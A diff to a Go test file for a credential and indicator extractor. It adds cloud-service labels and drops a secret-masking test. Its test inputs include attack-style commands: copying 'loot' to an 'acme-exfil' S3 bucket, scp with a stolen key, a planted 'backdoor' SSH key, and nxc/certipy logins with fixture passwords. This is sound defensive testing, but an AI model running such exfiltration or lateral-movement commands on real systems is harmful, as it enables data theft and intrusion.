@@ -28,6 +28,9 @@ func brief(items []Item) []string {
 		if it.Form != "" && it.Form != it.Kind {
 			s += " (" + it.Form + ")"
 		}
+		if it.Service != "" {
+			s += " for " + it.Service
+		}
 		out = append(out, s)
 	}
 	return out
@@ -46,8 +49,8 @@ func TestExtractLines(t *testing.T) {
 		{"both on one line", `user=alice password=Spring2026!`, []string{"username=alice", "password=Spring2026! of alice"}},
 		{"fields that belong together by their names", "DB_USER=app_rw\nDB_PASSWORD=Fixture-Pass-01\nSMTP_USER=alerts\nAPI_TOKEN=fixture-token-0123", []string{"username=app_rw", "password=Fixture-Pass-01 of app_rw", "username=alerts", "password=fixture-token-0123 (token)"}},
 		{"a quoted assignment", `PASS='Winter2025!'`, []string{"password=Winter2025!"}},
-		{"a name that ends as a secret does", `MSOL_PASS="Qw7#fake"`, []string{"password=Qw7#fake"}},
-		{"a token and a key by their names", "access_token=abcdef123456\napi_key: K-998877", []string{"password=abcdef123456 (token)", "password=K-998877 (key)"}},
+		{"a name that ends as a secret does", `MSOL_PASS="Qw7#fake"`, []string{"password=Qw7#fake for Microsoft 365"}},
+		{"a token and a key by their names", "access_token=abcdef123456\napi_key: K-998877", []string{"password=abcdef123456 (token)", "apikey=K-998877 (key)"}},
 		{"a variable given its value", "U=svc_backup\nP='Winter2025!'\nnxc smb 10.0.0.5 -u \"$U\" -p \"$P\"", []string{"password=Winter2025! of svc_backup", "username=svc_backup"}},
 		{"a variable inside a name", "N=msol\ncertipy find -u \"$N@corp.example\" -p 'Qw7#fake'", []string{"password=Qw7#fake of msol@corp.example", "username=msol@corp.example"}},
 		{"a default value", `USER="${AD_USER:-svc_backup}"`, []string{"username=svc_backup"}},
@@ -61,7 +64,7 @@ func TestExtractLines(t *testing.T) {
 		{"a locked shadow line", `root:*:19000:0:99999:7:::`, nil},
 		{"a passwd line", `svc:x:1001:1001:Service:/home/svc:/bin/bash`, []string{"username=svc"}},
 		{"a password in an address", `mount //files01/share -o x; curl ftp://backup:Hunter22@files01.corp.local/x`, []string{"password=Hunter22 of backup", "device=files01.corp.local"}},
-		{"a remote login", `ssh -i k ops@build01 'id'`, []string{"username=ops", "device=build01"}},
+		{"a remote login", `ssh -i k ops@build01 'id'`, []string{"username=ops", "sshkey=k of ops (key file) for build01", "device=build01"}},
 		{"a remote login by address", `ssh ops@198.51.100.7 'cat /etc/hostname'`, []string{"username=ops"}},
 		{"a share", `net use \\FILES01\c$ /user:CORP\helper Passw0rd!x`, []string{"username=helper", "password=Passw0rd!x of helper", "device=FILES01"}},
 		{"a scan report", `Nmap scan report for dc01.corp.example (10.20.1.5)`, []string{"device=dc01.corp.example"}},
@@ -156,7 +159,10 @@ func TestFromIndicator(t *testing.T) {
 		{"Email", "alice@corp.example", Item{Kind: "email", Value: "alice@corp.example", Line: 3}, true},
 		{"IPv4", "10.20.1.5", Item{Kind: "ip", Value: "10.20.1.5", Line: 3}, true},
 		{"JWT", "eyJhbGciOiJ.eyJzdWIiOiI.sig", Item{Kind: "password", Value: "eyJhbGciOiJ.eyJzdWIiOiI.sig", Form: "token", Line: 3}, true},
-		{"PrivateKey", "-----BEGIN RSA PRIVATE KEY-----", Item{Kind: "password", Value: "rsa private key", Form: "key", Line: 3, Open: true}, true},
+		{"PrivateKey", "-----BEGIN PRIVATE KEY-----", Item{Kind: "password", Value: "private key", Form: "key", Line: 3}, true},
+		{"PrivateKey", "-----BEGIN RSA PRIVATE KEY-----", Item{}, false},
+		{"AWSKey", "AKIAIOSFODNN7EXAMPLE", Item{Kind: "apikey", Value: "AKIAIOSFODNN7EXAMPLE", Form: "key", Service: "AWS", Line: 3}, true}, //nolint:gosec // G101: the key of the AWS documentation, which opens nothing.
+		{"JWT", microsoftToken, Item{Kind: "password", Value: microsoftToken, Form: "token", Service: "Microsoft 365", Line: 3}, true},
 		{"URL", "http://x", Item{}, false},
 		{"IPv4", "127.0.0.1", Item{}, false},
 		{"Email", "not an address", Item{}, false},
@@ -189,7 +195,10 @@ func TestFromHardcoded(t *testing.T) {
 	for _, k := range table.Kinds() {
 		titles[k.Name] = k.Targeted
 	}
-	want := map[string]string{"password": "", "username": "Usernames", "email": "Email addresses", "device": "Hostnames", "ip": "IP addresses"}
+	want := map[string]string{
+		"password": "", "username": "Usernames", "email": "Email addresses", "tenant": "", "sshkey": "", "apikey": "",
+		"application": "", "resource": "", "device": "Hostnames", "ip": "IP addresses",
+	}
 	if !maps.Equal(titles, want) {
 		t.Errorf("targeted titles = %v, want %v", titles, want)
 	}
@@ -199,30 +208,12 @@ func TestKinds(t *testing.T) {
 	var names []string
 	for _, k := range load(t).Kinds() {
 		names = append(names, k.Name)
-		if k.Secret != (k.Name == "password") {
+		if k.Secret != (k.Name == "password" || k.Name == "apikey") {
 			t.Errorf("%s: secret = %t", k.Name, k.Secret)
 		}
 	}
-	if want := []string{"password", "username", "email", "device", "ip"}; !slices.Equal(names, want) {
+	if want := []string{"password", "username", "email", "tenant", "sshkey", "apikey", "application", "resource", "device", "ip"}; !slices.Equal(names, want) {
 		t.Errorf("kinds = %q, want %q", names, want)
-	}
-}
-
-func TestMask(t *testing.T) {
-	for secret, want := range map[string]string{
-		"":                                 " (0 chars)",
-		"abcd":                             "**** (4 chars)",
-		"Winter2025!":                      "Wi********! (11 chars)",
-		"hunter":                           "hu***r (6 chars)",
-		"pässwörd":                         "pä*****d (8 chars)",
-		"8846f7eaee8fb117ad06bdd830b7586c": "88********c (32 chars)",
-	} {
-		if got := Mask(secret); got != want {
-			t.Errorf("Mask(%q) = %q, want %q", secret, got, want)
-		}
-		if secret != "" && strings.Contains(Mask(secret), secret) {
-			t.Errorf("Mask(%q) holds the secret", secret)
-		}
 	}
 }
 
@@ -266,5 +257,89 @@ func TestDecodeRejects(t *testing.T) {
 				t.Errorf("decode(%s) gave no error", data)
 			}
 		})
+	}
+}
+
+// microsoftToken is a JSON web token whose claims name the issuer of Microsoft:
+// {"iss":"https://sts.windows.net/6f9619ff-8b86-4d11-b42d-00c04fc964ff/"}.
+//
+//nolint:gosec // G101: a made-up token with no signature of any key.
+const microsoftToken = "eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC82Zjk2MTlmZi04Yjg2LTRkMTEtYjQyZC0wMGMwNGZjOTY0ZmYvIn0.c2lnbmF0dXJl"
+
+// The exposure names the tenants, the SSH keys with their hosts, the API
+// keys with their services, and what is of Microsoft 365 and Google Cloud.
+func TestExtractServices(t *testing.T) {
+	table := load(t)
+	const guid, app = "6f9619ff-8b86-4d11-b42d-00c04fc964ff", "1b2c3d4e-5f60-4718-8293-a4b5c6d7e8f9"
+	const key = "AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yYmFja2Rvb3JiYWNrZG9vcmJhY2tkb29y"
+	const printed = "ssh-ed25519 SHA256:Ddp3soYTdzq1tXKnpZgVrTfTOXeC2oHvS7SeMWqylYU"
+	tests := []struct {
+		name, text string
+		want       []string
+	}{
+		{"a tenant by its field", "AZURE_TENANT_ID=" + guid, []string{"tenant=" + guid + " for Microsoft 365"}},
+		{"a tenant in the address of a login", "curl https://login.microsoftonline.com/" + guid + "/oauth2/v2.0/token", []string{"tenant=" + guid + " for Microsoft 365"}},
+		{"a tenant by its domain", "Connect-MgGraph -TenantId contoso.onmicrosoft.com", []string{"tenant=contoso.onmicrosoft.com for Microsoft 365"}},
+		{"no tenant that is every tenant", "curl https://login.microsoftonline.com/common/oauth2/token", nil},
+		{"an application of Microsoft", "client_id: " + app, []string{"application=" + app + " for Microsoft 365"}},
+		{"an application of Google", "client_id=1234567890-abc123def456.apps.googleusercontent.com", []string{"application=1234567890-abc123def456.apps.googleusercontent.com for Google Cloud"}},
+		{"a secret of a client of Microsoft", `AZURE_CLIENT_SECRET="Qz8~fakeClientSecretValue.0123456789abc"`, []string{"password=Qz8~fakeClientSecretValue.0123456789abc (secret) for Microsoft 365"}},
+		{"a site of SharePoint", "curl https://contoso.sharepoint.com/sites/finance", []string{"resource=contoso.sharepoint.com (site) for Microsoft 365"}},
+		{"a project and a bucket of Google", "gcloud compute instances list --project=acme-prod-4711\ngsutil ls gs://acme-prod-backups/", []string{"resource=acme-prod-4711 (project) for Google Cloud", "resource=gs://acme-prod-backups (bucket) for Google Cloud"}},
+		{"a project by its field", `"project_id": "acme-prod-4711"`, []string{"resource=acme-prod-4711 (project) for Google Cloud"}},
+		{"a bucket of AWS", "aws s3 cp loot.tgz s3://acme-exfil/loot.tgz", []string{"resource=s3://acme-exfil (bucket) for AWS"}},
+		{"a key by its form", "curl -H 'x: ghp_Ab3dE9fGh1JkLm5nPq7RsTu2VwXy4Z0c8Ab3' https://api.github.com/user", []string{"apikey=ghp_Ab3dE9fGh1JkLm5nPq7RsTu2VwXy4Z0c8Ab3 (key) for GitHub"}},
+		{"a key by the name of its field", "OPENAI_API_KEY=not-in-the-usual-form-123", []string{"apikey=not-in-the-usual-form-123 (key) for OpenAI"}},
+		{"a key of no known service", "INTERNAL_API_KEY=9f8e7d6c5b4a3928", []string{"apikey=9f8e7d6c5b4a3928 (key)"}},
+		{"a key of AWS by its field", "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", []string{"apikey=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY (key) for AWS"}},
+		{"a key of Anthropic and not of OpenAI", "ANTHROPIC=sk-ant-api03-Ab3dE9fGh1JkLm5nPq7RsTu2VwXy", []string{"apikey=sk-ant-api03-Ab3dE9fGh1JkLm5nPq7RsTu2VwXy (key) for Anthropic"}},
+		{"no key inside a longer word", "see task-sk-0123456789abcdefghijklmnop and risk-0123456789abcdefghijklmnop", nil},
+		{"a public key and whose it is", "ssh-ed25519 " + key + " backdoor@attacker-box", []string{"username=backdoor", "sshkey=" + printed + " of backdoor (public key) for attacker-box", "device=attacker-box"}},
+		{"a public key with a note that is no host", "ssh-ed25519 " + key + " backup key", []string{"sshkey=" + printed + " (public key)"}},
+		{"the key of a known host", "bastion01.corp.internal,10.20.30.7 ssh-ed25519 " + key, []string{"sshkey=" + printed + " (public key) for bastion01.corp.internal", "sshkey=" + printed + " (public key)", "device=bastion01.corp.internal"}},
+		{"the key of a known host and port", "[git.corp.internal]:2222 ssh-ed25519 " + key, []string{"sshkey=" + printed + " (public key) for git.corp.internal:2222", "sshkey=" + printed + " (public key)", "device=git.corp.internal"}},
+		{"a private key of SSH", "-----BEGIN OPENSSH PRIVATE KEY-----", []string{"sshkey=OPENSSH PRIVATE KEY (private key)"}},
+		{"a key file and the host it opens", "scp -i /tmp/stolen_key loot.tgz deploy@bastion01:/tmp/", []string{"username=deploy", "sshkey=/tmp/stolen_key of deploy (key file) for bastion01", "device=bastion01"}},
+		{"an account of a service of Google", "mail: deployer@acme-prod-4711.iam.gserviceaccount.com", []string{"email=deployer@acme-prod-4711.iam.gserviceaccount.com for Google Cloud"}},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := brief(table.Extract(tt.text)); !slices.Equal(got, tt.want) {
+				t.Errorf("Extract(%q) =\n  %q, want\n  %q", tt.text, got, tt.want)
+			}
+		})
+	}
+	groups := 0
+	for _, s := range table.Services() {
+		if s.Group {
+			groups++
+		}
+	}
+	if groups != 2 || len(table.Services()) < 10 {
+		t.Errorf("%d services, %d with a group of their own, want Microsoft 365 and Google Cloud among ten or more", len(table.Services()), groups)
+	}
+}
+
+func TestWords(t *testing.T) {
+	for key, want := range map[string][]string{
+		"GITHUB_TOKEN": {"github", "token"}, "ghToken": {"gh", "token"}, "aws.secret-access_key": {"aws", "secret", "access", "key"},
+		"OpenAIKey": {"open", "aikey"}, "x": {"x"}, "": nil, "__": nil,
+	} {
+		if got := words(key); !slices.Equal(got, want) {
+			t.Errorf("words(%q) = %q, want %q", key, got, want)
+		}
+	}
+}
+
+func TestFingerprint(t *testing.T) {
+	for key, want := range map[string]string{
+		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yYmFja2Rvb3JiYWNrZG9vcmJhY2tkb29y":      "ssh-ed25519 SHA256:Ddp3soYTdzq1tXKnpZgVrTfTOXeC2oHvS7SeMWqylYU",
+		"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yYmFja2Rvb3JiYWNrZG9vcmJhY2tkb29y note": "ssh-ed25519 SHA256:Ddp3soYTdzq1tXKnpZgVrTfTOXeC2oHvS7SeMWqylYU",
+		"ssh-rsa not*base64": "ssh-rsa not*base64",
+		"alone":              "alone",
+	} {
+		if got := fingerprint(key); got != want {
+			t.Errorf("fingerprint(%q) = %q, want %q", key, got, want)
+		}
 	}
 }
